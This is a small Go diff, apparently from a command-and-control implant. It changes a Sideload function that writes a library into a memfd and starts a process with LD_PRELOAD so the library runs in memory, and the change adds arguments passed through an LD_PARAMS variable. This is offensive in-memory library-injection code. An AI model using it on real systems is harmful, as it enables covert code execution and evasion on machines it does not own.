@@ -57,7 +57,7 @@ func RemoteTask(processID int, data []byte, rwxPages bool) error {
 }
 
 // Sideload - Side load a library and return its output
-func Sideload(procName string, data []byte) (string, error) {
+func Sideload(procName string, data []byte, args string) (string, error) {
 	var (
 		nrMemfdCreate int
 		stdOut        bytes.Buffer
@@ -89,8 +89,13 @@ func Sideload(procName string, data []byte) (string, error) {
 	//{{if .Debug}}
 	log.Printf("Data written in %s\n", fdPath)
 	//{{end}}
+	env := []string{
+		fmt.Sprintf("LD_PARAMS=%s", args),
+		fmt.Sprintf("LD_PRELOAD=%s", fdPath),
+		fmt.Sprintf("PATH=%s", os.Getenv("PATH")),
+	}
 	cmd := exec.Command(procName)
-	cmd.Env = []string{fmt.Sprintf("LD_PRELOAD=%s", fdPath), fmt.Sprintf("PATH=%s", os.Getenv("PATH"))}
+	cmd.Env = env
 	cmd.Stdout = &stdOut
 	cmd.Stderr = &stdErr
 	//{{if .Debug}}
